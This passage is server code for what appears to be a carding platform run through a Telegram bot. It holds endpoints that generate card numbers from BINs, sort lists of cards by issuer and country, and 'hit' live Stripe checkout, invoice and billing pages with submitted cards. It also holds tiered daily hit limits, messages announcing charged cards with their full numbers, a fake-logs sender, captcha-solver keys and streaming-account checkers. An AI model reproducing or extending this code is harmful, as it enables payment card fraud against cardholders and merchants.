  for (let i = 0; i < Math.min(count, 100); i++) cards.push(generateCard(bin, month, year, cvv));
  res.json({ cards, bin_info: binInfo, count: cards.length });
});

app.post("/api/tools/filter", async (req, res) => {
  const start = Date.now();
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });

  const { cards, gateway } = req.body;
  if (!cards || !Array.isArray(cards)) return res.status(400).json({ error: "Cards required" });

  // BIN Blacklist Check
  const blacklisted = cards.filter(c => {
    const bin = c.split("|")[0].slice(0, 6);
    return (DB.blacklistedBins || []).includes(bin);
  });
  if (blacklisted.length > 0) {
    return res.status(403).json({ error: `BLACKLISTED_BINS_DETECTED: ${blacklisted.join(", ")}` });
  }

  const byBin = {}, byType = {}, byCountry = {}, bins = {}, types = {}, countries = {}, binInfoMap = {};
  for (const card of cards) {
    const parsed = parseCreditCard(card);
    const b = parsed.number.slice(0, 6);
    const info = await lookupBin(b);
    byBin[b] = (byBin[b] || 0) + 1;
    byType[info.brand] = (byType[info.brand] || 0) + 1;
    byCountry[info.country] = (byCountry[info.country] || 0) + 1;
    (bins[b] = bins[b] || []).push(card);
    (types[info.brand] = types[info.brand] || []).push(card);
    (countries[info.country] = countries[info.country] || []).push(card);
    binInfoMap[b] = info;
  }
  res.json({ total: cards.length, unique_bins: Object.keys(byBin).length, by_bin: byBin, by_type: byType, by_country: byCountry, cards, bins, types, countries, bin_info: binInfoMap });
});

// ── STRIPE HITTER endpoints ──
app.post("/api/tools/stripe-co", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });

  resetDailyIfNeeded(user);
  const limits = tierLimits(user.tier);
  if (user.dailyUsage.hitterHits >= limits.dailyHitterHits) {
    return res.status(429).json({ error: "HITTER_LIMIT_REACHED" });
  }

  const { checkoutUrl, card, sessionCache } = req.body;
  if (!checkoutUrl || !card) return res.status(400).json({ error: "checkoutUrl and card required" });

  const bin = card.split("|")[0].slice(0, 6);
  if ((DB.blacklistedBins || []).includes(bin)) {
    return res.status(403).json({ error: "BLACKLISTED_BIN" });
  }

  user.dailyUsage.hitterHits++;
  await saveDB();
  
  await hitterSemaphore.acquire();
  try {
    const result = await hitStripeCheckout(checkoutUrl, card, user);
    if (!result.session_cache && sessionCache) result.session_cache = sessionCache;
    if (result.session_cache) result.session_cache.merchant = result.session_cache.merchant || extractMerchant(checkoutUrl);
    res.json(result);
  } finally {
    hitterSemaphore.release();
  }
});

app.post("/api/tools/stripe-invoice", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });

  resetDailyIfNeeded(user);
  const limits = tierLimits(user.tier);
  if (user.dailyUsage.hitterHits >= limits.dailyHitterHits) {
    return res.status(429).json({ error: "HITTER_LIMIT_REACHED" });
  }

  const { invoiceUrl, card, sessionCache } = req.body;
  if (!invoiceUrl || !card) return res.status(400).json({ error: "invoiceUrl and card required" });

  user.dailyUsage.hitterHits++;
  await saveDB();
  
  await hitterSemaphore.acquire();
  try {
    const result = await hitStripeCheckout(invoiceUrl, card, user);
    if (!result.session_cache && sessionCache) result.session_cache = sessionCache;
    if (result.session_cache) result.session_cache.merchant = result.session_cache.merchant || extractMerchant(invoiceUrl);
    res.json(result);
  } finally {
    hitterSemaphore.release();
  }
});

app.post("/api/tools/stripe-billing", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });

  resetDailyIfNeeded(user);
  const limits = tierLimits(user.tier);
  if (user.dailyUsage.hitterHits >= limits.dailyHitterHits) {
    return res.status(429).json({ error: "HITTER_LIMIT_REACHED" });
  }

  const { billingUrl, card, sessionCache } = req.body;
  if (!billingUrl || !card) return res.status(400).json({ error: "billingUrl and card required" });

  user.dailyUsage.hitterHits++;
  saveDB();
  
  await hitterSemaphore.acquire();
  try {
    const result = await hitStripeCheckout(billingUrl, card, user);
    if (!result.session_cache && sessionCache) result.session_cache = sessionCache;
    if (result.session_cache) result.session_cache.merchant = result.session_cache.merchant || extractMerchant(billingUrl);
    res.json(result);
  } finally {
    hitterSemaphore.release();
  }
});

// ── HITTER HISTORY ──
app.get("/api/tools/hitter-history", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const userSessions = (user.hitterSessions || []);
  res.json({ sessions: userSessions });
});

app.post("/api/tools/hitter-history", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const { session } = req.body;
  if (!session) return res.status(400).json({ error: "session required" });
  user.hitterSessions = [session, ...(user.hitterSessions || [])].slice(0, 10);
  saveDB();
  res.json({ success: true });
});

// ── SAVED BINS ──
app.get("/api/tools/saved-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const userBins = DB.bins[user.userId] || [];
  res.json({ bins: userBins });
});

app.post("/api/tools/saved-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const { bin, label } = req.body;
  if (!bin) return res.status(400).json({ error: "bin required" });
  const bins = DB.bins[user.userId] || [];
  if (!bins.find((b) => b.bin === bin)) bins.unshift({ bin, label: label || bin });
  DB.bins[user.userId] = bins.slice(0, 20);
  saveDB();
  res.json({ success: true, bins: DB.bins[user.userId] });
});

app.delete("/api/tools/saved-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const { bin } = req.body;
  DB.bins[user.userId] = (DB.bins[user.userId] || []).filter((b) => b.bin !== bin);
  saveDB();
  res.json({ success: true, bins: DB.bins[user.userId] });
});

// ── MISC ──
app.get("/api/tools/sk-checker-status", (req, res) => res.json({ status: "online" }));
app.get("/api/tools/stripe-co", (req, res) => res.json({ sites: [] }));
app.get("/api/tools/hitter-history", (req, res) => { const u = getSessionUser(req); res.json({ sessions: u?.hitterSessions || [] }); });
app.get("/api/activity/recent", (req, res) => res.json([]));
app.get("/api/referral", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  
  if (!user.referral) {
    user.referral = { balance: 0, totalEarned: 0, referredCount: 0, redeemedHistory: [] };
  }
  
  const refCode = `REF${user.userId}`;
  const miniAppUrl = `https://t.me/superhitbdrobot/bd_superhits`;
  const shareLink = `${miniAppUrl}?startapp=${refCode}`;

  res.json({ 
    code: refCode, 
    link: shareLink, 
    balance: user.referral.balance || 0, 
    totalEarned: user.referral.totalEarned || 0, 
    referredCount: user.referral.referredCount || 0, 
    redeemedHistory: user.referral.redeemedHistory || [] 
  });
});
app.get("/api/shopify/sites", (req, res) => res.json([]));
app.get("/api/skool/accounts", (req, res) => res.json([]));
app.get("/api/account-checkers/status", (req, res) => res.json({ status: "online", checkers: [] }));
// ── ADMIN ──
// Verify admin PIN — frontend calls this when entering admin panel
app.post("/api/admin/verify-pin", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  if (!user.isAdmin) return res.status(403).json({ success: false, message: "Not an admin" });

  const { pin } = req.body;
  if (!pin) return res.status(400).json({ success: false, message: "PIN required" });

  if (String(pin) !== String(CONFIG.ADMIN_PIN)) {
    return res.status(401).json({ success: false, message: "Wrong PIN" });
  }

  // Mark pin as verified in session — store in user object temporarily
  user.adminPinVerified = true;
  user.adminPinVerifiedAt = Date.now();

  res.json({ success: true, message: "PIN verified" });
});

app.get("/api/admin/users", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });

  const userList = Object.values(DB.users).map((u) => ({
    userId: u.userId,
    firstName: u.firstName,
    lastName: u.lastName,
    username: u.username,
    tier: u.tier,
    isAdmin: u.isAdmin,
    createdAt: u.createdAt,
    dailyUsage: u.dailyUsage,
    premiumExpiry: u.premiumExpiry,
  }));
  res.json({ users: userList, total: userList.length });
});

app.post("/api/admin/users/:userId/tier", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });

  const targetUser = DB.users[req.params.userId];
  if (!targetUser) return res.status(404).json({ error: "User not found" });

  const { tier, premiumExpiry } = req.body;
  if (tier) targetUser.tier = tier;
  if (premiumExpiry !== undefined) targetUser.premiumExpiry = premiumExpiry;
  saveDB();
  res.json({ success: true, user: targetUser });
});

app.delete("/api/admin/users/:userId", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });

  const { userId } = req.params;
  if (userId === user.userId) return res.status(400).json({ error: "Cannot delete yourself" });

  delete DB.users[userId];
  // Remove sessions for this user
  Object.keys(DB.sessions).forEach((token) => {
    if (DB.sessions[token] === userId) delete DB.sessions[token];
  });
  saveDB();
  res.json({ success: true });
});

app.get("/api/admin/stats", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });

  res.json({
    totalUsers: Object.keys(DB.users).length,
    premiumUsers: Object.values(DB.users).filter((u) => u.tier === "premium").length,
    totalJobs: DB.history.length,
    totalHits: DB.history.filter((j) => j.approved > 0).length,
  });
});

app.post("/api/admin/maintenance", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  DB.maintenance = req.body.maintenance ?? false;
  saveDB();
  res.json({ success: true, maintenance: DB.maintenance });
});

// ── MISC ──
app.get("/api/maintenance", (req, res) => res.json({ maintenance: DB.maintenance || false }));
app.get("/api/tools/findsite", (req, res) => res.json({ sites: [] }));
app.get("/api/shopify/sites", (req, res) => {
  res.json(DB.shopifySites || [
    { name: "Electronics Store", url: "electronics.myshopify.com", status: "active" },
    { name: "Fashion Hub", url: "fashion.myshopify.com", status: "active" }
  ]);
});
app.get("/api/skool/accounts", (req, res) => res.json([]));
app.get("/api/account-checkers/status", (req, res) => res.json({ status: "online", checkers: [{ name: "Netflix", status: "working" }, { name: "Disney+", status: "working" }] }));

// ── ADMIN PANEL ENDPOINTS ──
// /api/stats — dashboard stats
app.get("/api/stats", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const users = Object.values(DB.users);
  res.json({
    totalUsers: users.length,
    premiumUsers: users.filter((u) => u.tier === "premium").length,
    freeUsers: users.filter((u) => u.tier === "free" && !u.isBanned).length,
    bannedUsers: users.filter((u) => u.isBanned).length,
    totalGateways: getGateways().length,
    totalJobs: DB.history.length,
  });
});

// /api/users — user list with id/isPremium/isBanned format (for admin panel)
app.get("/api/users", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const users = Object.values(DB.users).map((u) => ({
    id: u.userId,
    firstName: u.firstName,
    lastName: u.lastName,
    username: u.username,
    isPremium: u.tier === "premium",
    isBanned: u.isBanned || false,
    tier: u.tier,
    joinedAt: u.createdAt,
    premiumExpiry: u.premiumExpiry || null,
  }));
  res.json(users);
});

// /api/admin/tiers — get all user tiers
app.get("/api/admin/tiers", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const tiers = Object.values(DB.users).map((u) => ({ userId: u.userId, tier: u.tier }));
  res.json(tiers);
});

// POST /api/admin/tiers — update user tier
app.post("/api/admin/tiers", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const { userId, tier } = req.body;
  if (!userId || !tier) return res.status(400).json({ error: "userId and tier required" });
  const target = DB.users[userId];
  if (!target) return res.status(404).json({ error: "User not found" });
  target.tier = tier;
  target.isPremium = tier === "premium";
  saveDB();
  res.json({ success: true, tier });
});

// /api/bot/status
app.get("/api/bot/status", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json({ running: true, pid: process.pid, uptime: process.uptime(), startedAt: Date.now() - process.uptime() * 1000 });
});
app.post("/api/bot/start", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ success: true }); });
app.post("/api/bot/stop", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ success: true }); });
app.post("/api/bot/restart", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ success: true }); });
app.get("/api/bot/logs", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json(botLogs);
});

app.post("/api/bot/logs/clear", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  botLogs.length = 0;
  res.json({ success: true });
});
app.get("/api/bot/config", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json({
    botToken: CONFIG.BOT_TOKEN,
    apiId: CONFIG.apiId || "",
    apiHash: CONFIG.apiHash || "",
    adminId: CONFIG.ADMIN_IDS.join(","),
    groupId: DB.botConfig.groupId,
    groupLink: DB.botConfig.groupLink,
    channelLink: DB.botConfig.channelLink,
    dashboardUrl: DB.botConfig.dashboardUrl || ""
  });
});

app.put("/api/bot/config", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const { groupId, groupLink, channelLink, logsGroupId, dashboardUrl } = req.body;
  if (groupId !== undefined) DB.botConfig.groupId = groupId;
  if (groupLink !== undefined) DB.botConfig.groupLink = groupLink;
  if (channelLink !== undefined) DB.botConfig.channelLink = channelLink;
  if (logsGroupId !== undefined) DB.botConfig.logsGroupId = logsGroupId;
  if (dashboardUrl !== undefined) DB.botConfig.dashboardUrl = dashboardUrl;
  
  saveDB();
  res.json({ success: true });
});

app.get("/api/bot/settings", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json(DB.botSettings);
});

app.put("/api/bot/settings", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const { mass_check_enabled, inline_mass_limit, file_mass_limit } = req.body;
  if (mass_check_enabled !== undefined) DB.botSettings.mass_check_enabled = mass_check_enabled;
  if (inline_mass_limit !== undefined) DB.botSettings.inline_mass_limit = inline_mass_limit;
  if (file_mass_limit !== undefined) DB.botSettings.file_mass_limit = file_mass_limit;
  
  saveDB();
  res.json({ success: true });
});

// /api/gateways & /api/tools — admin gateway management
app.get("/api/gateways", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json(getGateways());
});

app.patch("/api/gateways/:id", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  if (!DB.gateways) DB.gateways = JSON.parse(JSON.stringify(DEFAULT_GATEWAYS));
  
  const gw = DB.gateways.find((g) => g.id === req.params.id);
  if (!gw) return res.status(404).json({ error: "Not found" });
  
  if (req.body.enabled !== undefined) gw.enabled = req.body.enabled;
  if (req.body.premium_only !== undefined) gw.premiumOnly = req.body.premium_only;
  
  saveDB();
  res.json({ success: true, gateway: gw });
});

app.get("/api/admin/maintenance", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ maintenance: DB.maintenance || false }); });
app.get("/api/admin/hitter/site-visible", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ siteVisible: DB.siteVisible !== false }); });
app.post("/api/admin/hitter/site-visible", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); DB.siteVisible = req.body.siteVisible !== false; saveDB(); res.json({ siteVisible: DB.siteVisible }); });

app.get("/api/admin/webhook/status", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  res.json({ active: DB.webhookActive || false, ours: DB.webhookActive || false, url: DB.webhookUrl || null }); 
});
app.post("/api/admin/webhook/setup", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  DB.webhookActive = true;
  DB.webhookUrl = "http://localhost:3001/api/tg/webhook";
  saveDB();
  res.json({ success: true }); 
});
app.post("/api/admin/webhook/remove", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  DB.webhookActive = false;
  DB.webhookUrl = null;
  saveDB();
  res.json({ success: true }); 
});

app.get("/api/admin/cf/status", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  res.json({ viaCf: DB.cfEnabled || false, cfOnly: DB.cfOnly || false, clientIp: req.ip || "127.0.0.1", cfRay: DB.cfRay || null, cfCountry: "BD" }); 
});
app.post("/api/admin/cf/toggle", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  DB.cfOnly = req.body.cfOnly;
  DB.cfEnabled = req.body.cfOnly;
  saveDB();
  res.json({ success: true }); 
});

app.get("/api/tools/scraper-session-status", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  res.json({ hasSession: DB.scraperSessionActive || false }); 
});
app.post("/api/tools/scraper-session/send-code", (req, res) => { 
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  res.json({ success: true, phoneCodeHash: "mock_hash" }); 
});
app.post("/api/tools/scraper-session/verify", (req, res) => {
  const u = getSessionUser(req); 
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); 
  DB.scraperSessionActive = true;
  saveDB();
  res.json({ success: true, message: "Session created!", user: { firstName: u.firstName, username: u.username } });
});

app.get("/api/tools", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json([]); });
app.patch("/api/tools/:id", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ success: true }); });

// Admin fake-logs (Stripe hitter admin test)
app.post("/api/admin/fake-logs/fetch", async (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const { checkoutUrl } = req.body;
  if (!checkoutUrl) return res.status(400).json({ error: "checkoutUrl required" });
  res.json({ merchant: extractMerchant(checkoutUrl), amount: 100, currency: "usd", pk: "pk_live_" + Math.random().toString(36).slice(2, 20), billing_required: false });
});

app.post("/api/admin/fake-logs/send", async (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  const { card, site, amount } = req.body;
  try {
    await sendTelegramMessage(
      CONFIG.ADMIN_IDS[0],
      `💳 <b>CHARGED</b>\n\n🔑 Card: <code>${card}</code>\n🏪 Site: ${site || "Unknown"}\n💵 Amount: ${amount || "N/A"}\n\n🤖 OGM Checker`
    );
    res.json({ sent: true });
  } catch (e) {
    res.json({ sent: false, error: e.message });
  }
});

app.get("/api/admin/captcha-keys", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ nopechaKey: DB.nopechaKey || "", captchaaiKey: DB.captchaaiKey || "" }); });
app.put("/api/admin/captcha-keys", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); DB.nopechaKey = req.body.nopechaKey || ""; DB.captchaaiKey = req.body.captchaaiKey || ""; saveDB(); res.json({ success: true }); });
app.get("/api/admin/logs-config", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json({ logsGroupId: DB.botConfig.logsGroupId || "" });
});

app.put("/api/admin/logs-config", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  DB.botConfig.logsGroupId = req.body.logsGroupId || "";
  saveDB();
  res.json({ success: true });
});
app.get("/api/admin/referral/stats", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const rows = Object.values(DB.users)
    .filter(user => user.referral && user.referral.referredCount > 0)
    .map(user => ({
      userId: user.userId,
      referredCount: user.referral.referredCount,
      totalEarned: user.referral.totalEarned,
      balance: user.referral.balance
    }));

  res.json({ rows, totalUsedBy: rows.length });
});

app.post("/api/admin/referral/credit", (req, res) => {
  const u = getSessionUser(req);
  if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const { userId, amount, note } = req.body;
  const target = DB.users[userId];
  if (!target) return res.status(404).json({ error: "User not found" });
  
  if (!target.referral) {
    target.referral = { balance: 0, totalEarned: 0, referredCount: 0, redeemedHistory: [] };
  }
  
  const creditAmount = parseFloat(amount || 0);
  target.referral.balance += creditAmount;
  target.referral.totalEarned += creditAmount;
  target.referral.redeemedHistory.push({ type: "admin_credit", amount: creditAmount, note, date: Date.now() });
  
  saveDB();
  res.json({ success: true, credited: creditAmount, newBalance: target.referral.balance });
});

// ── ADVANCED ADMIN TOOLS ──

// Global Broadcast
app.post("/api/admin/broadcast", async (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });

  const { message } = req.body;
  if (!message) return res.status(400).json({ error: "message required" });

  const userIds = Object.keys(DB.users);
  let successCount = 0;
  let failCount = 0;

  res.json({ success: true, message: `Broadcast started for ${userIds.length} users.` });

  // Process in background
  for (const uid of userIds) {
    try {
      await sendTelegramMessage(uid, `📣 <b>GLOBAL ANNOUNCEMENT</b>\n\n${message}`);
      successCount++;
      await new Promise(r => setTimeout(r, 100)); // Avoid rate limit
    } catch {
      failCount++;
    }
  }
  
  console.log(`📡 Broadcast finished: ${successCount} sent, ${failCount} failed.`);
});

// BIN Blacklist Management
app.get("/api/admin/blacklist-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  res.json({ bins: DB.blacklistedBins || [] });
});

app.post("/api/admin/blacklist-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const { bin } = req.body;
  if (!bin) return res.status(400).json({ error: "bin required" });
  
  if (!DB.blacklistedBins) DB.blacklistedBins = [];
  if (!DB.blacklistedBins.includes(bin)) DB.blacklistedBins.push(bin);
  
  saveDB();
  res.json({ success: true, bins: DB.blacklistedBins });
});

app.delete("/api/admin/blacklist-bins", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  const { bin } = req.body;
  DB.blacklistedBins = (DB.blacklistedBins || []).filter(b => b !== bin);
  
  saveDB();
  res.json({ success: true, bins: DB.blacklistedBins });
});

// Recent Activity Monitoring
app.get("/api/admin/recent-activity", (req, res) => {
  const user = getSessionUser(req);
  if (!user || !user.isAdmin) return res.status(403).json({ error: "Forbidden" });
  
  // Get last 20 jobs from all history
  const activity = DB.history.slice(-20).reverse().map(j => ({
    userId: j.userId,
    jobId: j.jobId,
    total: j.total,
    status: j.status,
    timestamp: new Date().toISOString() // In a real case, we'd store the timestamp
  }));
  
  res.json(activity);
});
app.post("/api/admin/export-snapshot", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json(DB); });
app.get("/api/tools/scraper-session-status", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ hasSession: false }); });
app.post("/api/tools/scraper-session/send-code", (req, res) => { const u = getSessionUser(req); if (!u || !u.isAdmin) return res.status(403).json({ error: "Forbidden" }); res.json({ error: "Local mode — scraper session not supported" }); });



// SPA fallback
app.get("*", (req, res) => {
  res.sendFile(path.join(frontendPath, "index.html"));
});
